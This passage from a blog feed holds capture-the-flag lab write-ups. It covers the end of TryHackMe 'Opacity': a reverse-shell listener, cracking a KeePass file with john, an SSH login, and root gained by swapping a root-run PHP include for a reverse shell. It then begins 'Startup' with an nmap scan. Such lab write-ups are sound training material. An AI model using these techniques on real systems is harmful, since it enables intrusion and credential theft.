&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4444&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">4444&lt;/span> ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.11.65.91&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.163.225&lt;span class="o">]&lt;/span> &lt;span class="m">37874&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux opacity 5.4.0-139-generic &lt;span class="c1">#156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 14:47:56 up &lt;span class="m">37&lt;/span> min, &lt;span class="m">0&lt;/span> users, load average: 0.00, 0.00, 0.00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span> &lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span> &lt;span class="nv">groups&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/sh: 0: can&lt;span class="err">&amp;#39;&lt;/span>t access tty&lt;span class="p">;&lt;/span> job control turned off
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">www-data
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>In the opt folder I found out a dataset.kdbx file which stores the keepass credentials.&lt;/p>
&lt;p>I copied it in the / folder so I could download it from my machine.&lt;/p>
&lt;p>This type of file can be cracked using john:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">john --wordlist&lt;span class="o">=&lt;/span>/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt Keepasshash.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Using default input encoding: UTF-8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Loaded &lt;span class="m">1&lt;/span> password &lt;span class="nb">hash&lt;/span> &lt;span class="o">(&lt;/span>KeePass &lt;span class="o">[&lt;/span>SHA256 AES 32/64&lt;span class="o">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cost &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>iteration count&lt;span class="o">)&lt;/span> is &lt;span class="m">100000&lt;/span> &lt;span class="k">for&lt;/span> all loaded hashes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cost &lt;span class="m">2&lt;/span> &lt;span class="o">(&lt;/span>version&lt;span class="o">)&lt;/span> is &lt;span class="m">2&lt;/span> &lt;span class="k">for&lt;/span> all loaded hashes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cost &lt;span class="m">3&lt;/span> &lt;span class="o">(&lt;/span>algorithm &lt;span class="o">[&lt;/span>&lt;span class="nv">0&lt;/span>&lt;span class="o">=&lt;/span>AES &lt;span class="nv">1&lt;/span>&lt;span class="o">=&lt;/span>TwoFish &lt;span class="nv">2&lt;/span>&lt;span class="o">=&lt;/span>ChaCha&lt;span class="o">])&lt;/span> is &lt;span class="m">0&lt;/span> &lt;span class="k">for&lt;/span> all loaded hashes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Will run &lt;span class="m">4&lt;/span> OpenMP threads
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Press &lt;span class="s1">&amp;#39;q&amp;#39;&lt;/span> or Ctrl-C to abort, almost any other key &lt;span class="k">for&lt;/span> status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">741852963&lt;/span> &lt;span class="o">(&lt;/span>dataset&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1g 0:00:00:04 DONE &lt;span class="o">(&lt;/span>2024-01-05 09:58&lt;span class="o">)&lt;/span> 0.2105g/s 185.2p/s 185.2c/s 185.2C/s chichi..david1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Use the &lt;span class="s2">&amp;#34;--show&amp;#34;&lt;/span> option to display all of the cracked passwords reliably
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Session completed.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And now if we open the file with keepass we got the credentials!&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh sysadmin@10.10.163.225
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sysadmin@10.10.163.225&lt;span class="err">&amp;#39;&lt;/span>s password:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Welcome to Ubuntu 20.04.5 LTS &lt;span class="o">(&lt;/span>GNU/Linux 5.4.0-139-generic x86_64&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Documentation: https://help.ubuntu.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Management: https://landscape.canonical.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Support: https://ubuntu.com/advantage
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> System information as of Fri &lt;span class="m">05&lt;/span> Jan &lt;span class="m">2024&lt;/span> 03:03:45 PM UTC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> System load: 0.02 Processes: &lt;span class="m">125&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Usage of /: 57.1% of 8.87GB Users logged in: &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Memory usage: 28% IPv4 address &lt;span class="k">for&lt;/span> eth0: 10.10.163.225
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Swap usage: 0%
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> just raised the bar &lt;span class="k">for&lt;/span> easy, resilient and secure K8s cluster deployment.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> https://ubuntu.com/engage/secure-kubernetes-at-the-edge
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Introducing Expanded Security Maintenance &lt;span class="k">for&lt;/span> Applications.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Receive updates to over 25,000 software packages with your
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Ubuntu Pro subscription. Free &lt;span class="k">for&lt;/span> personal use.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> https://ubuntu.com/pro
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Expanded Security Maintenance &lt;span class="k">for&lt;/span> Applications is not enabled.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> updates can be applied immediately.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enable ESM Apps to receive additional future security updates.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">See https://ubuntu.com/esm or run: sudo pro status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The list of available updates is more than a week old.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">To check &lt;span class="k">for&lt;/span> new updates run: sudo apt update
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Last login: Wed Feb &lt;span class="m">22&lt;/span> 08:13:43 &lt;span class="m">2023&lt;/span> from 10.0.2.15
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sysadmin@opacity:~$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And we got the first flag.&lt;/p>
&lt;p>From here we have a scripts folder, inside there is a file owned by root:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat script.php
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;?php
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">//Backup of scripts sysadmin folder
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">require_once&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;lib/backup.inc.php&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">zipData&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;/home/sysadmin/scripts&amp;#39;&lt;/span>, &lt;span class="s1">&amp;#39;/var/backups/backup.zip&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s1">&amp;#39;Successful&amp;#39;&lt;/span>, PHP_EOL&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">//Files scheduled removal
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$dir&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;/var/www/html/cloud/images&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="o">(&lt;/span>file_exists&lt;span class="o">(&lt;/span>&lt;span class="nv">$dir&lt;/span>&lt;span class="o">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$di&lt;/span> &lt;span class="o">=&lt;/span> new RecursiveDirectoryIterator&lt;span class="o">(&lt;/span>&lt;span class="nv">$dir&lt;/span>, FilesystemIterator::SKIP_DOTS&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$ri&lt;/span> &lt;span class="o">=&lt;/span> new RecursiveIteratorIterator&lt;span class="o">(&lt;/span>&lt;span class="nv">$di&lt;/span>, RecursiveIteratorIterator::CHILD_FIRST&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> foreach &lt;span class="o">(&lt;/span> &lt;span class="nv">$ri&lt;/span> as &lt;span class="nv">$file&lt;/span> &lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$file&lt;/span>-&amp;gt;isDir&lt;span class="o">()&lt;/span> ? rmdir&lt;span class="o">(&lt;/span>&lt;span class="nv">$file&lt;/span>&lt;span class="o">)&lt;/span> : unlink&lt;span class="o">(&lt;/span>&lt;span class="nv">$file&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">?&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We see that this script calls &lt;code>lib/backup.inc.php&lt;/code> so what I have done is moving the original script out of the folder, and instead put mine which contains a reverse shell(I have used the pentestermonkey one)&lt;/p>
&lt;p>So the next time that the main script runs, we should have a reverse shell:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4444&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">4444&lt;/span> ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.11.65.91&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.163.225&lt;span class="o">]&lt;/span> &lt;span class="m">55346&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux opacity 5.4.0-139-generic &lt;span class="c1">#156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 15:20:02 up 1:09, &lt;span class="m">1&lt;/span> user, load average: 0.00, 0.00, 0.00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sysadmin pts/0 10.11.65.91 15:03 1:05 0.08s 0.08s -bash
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span> &lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span> &lt;span class="nv">groups&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bash: cannot &lt;span class="nb">set&lt;/span> terminal process group &lt;span class="o">(&lt;/span>2322&lt;span class="o">)&lt;/span>: Inappropriate ioctl &lt;span class="k">for&lt;/span> device
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bash: no job control in this shell
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root@opacity:/# ls
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Startup Writeup THM</title><link>https://simonefelici.github.io/p/startup-writeup-thm/</link><pubDate>Sun, 07 Jan 2024 00:00:00 +0000</pubDate><guid>https://simonefelici.github.io/p/startup-writeup-thm/</guid><description>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Startup-writeup-THM/main/91426f10-815e-4dce-8275-a7e4a86904b0_Export-603ed8d9-2b1a-49ce-8213-7061cce6ff07/Startup%2009519d3a5bfc4be5bd4c3ca84ece9361/Untitled.png" alt="Featured image of post Startup Writeup THM" />&lt;p>I will start with a nmap scan:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sC -sV 10.10.107.18
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-04 15:17 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.107.18
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.062s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">997&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>conn-refused&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">21/tcp open ftp vsftpd 3.0.3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ftp-syst:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> STAT:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> FTP server status:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Connected to 10.11.65.91
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Logged in as ftp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> TYPE: ASCII
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> No session bandwidth limit
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Session timeout in seconds is &lt;span class="m">300&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Control connection is plain text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Data connections will be plain text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> At session startup, client count was &lt;span class="m">2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> vsFTPd 3.0.3 - secure, fast, stable
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_End of status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ftp-anon: Anonymous FTP login allowed &lt;span class="o">(&lt;/span>FTP code 230&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> drwxrwxrwx &lt;span class="m">2&lt;/span> &lt;span class="m">65534&lt;/span> &lt;span class="m">65534&lt;/span> &lt;span class="m">4096&lt;/span> Nov &lt;span class="m">12&lt;/span> &lt;span class="m">2020&lt;/span> ftp &lt;span class="o">[&lt;/span>NSE: writeable&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> -rw-r--r-- &lt;span class="m">1&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">251631&lt;/span> Nov &lt;span class="m">12&lt;/span> &lt;span class="m">2020&lt;/span> important.jpg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_-rw-r--r-- &lt;span class="m">1&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">208&lt;/span> Nov &lt;span class="m">12&lt;/span> &lt;span class="m">2020&lt;/span> notice.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 &lt;span class="o">(&lt;/span>Ubuntu Linux&lt;span class="p">;&lt;/span> protocol 2.0&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssh-hostkey:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">2048&lt;/span> b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be &lt;span class="o">(&lt;/span>ECDSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ &lt;span class="m">256&lt;/span> a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f &lt;span class="o">(&lt;/span>ED25519&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.4.18 &lt;span class="o">((&lt;/span>Ubuntu&lt;span class="o">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache/2.4.18 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Maintenance
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: OSs: Unix, Linux&lt;span class="p">;&lt;/span> CPE: cpe:/o:linux:linux_kernel
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>First of all we see that in the ftp server allows Anonymous login and that there are 2 file in it.&lt;/p>
&lt;p>I will start with that:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
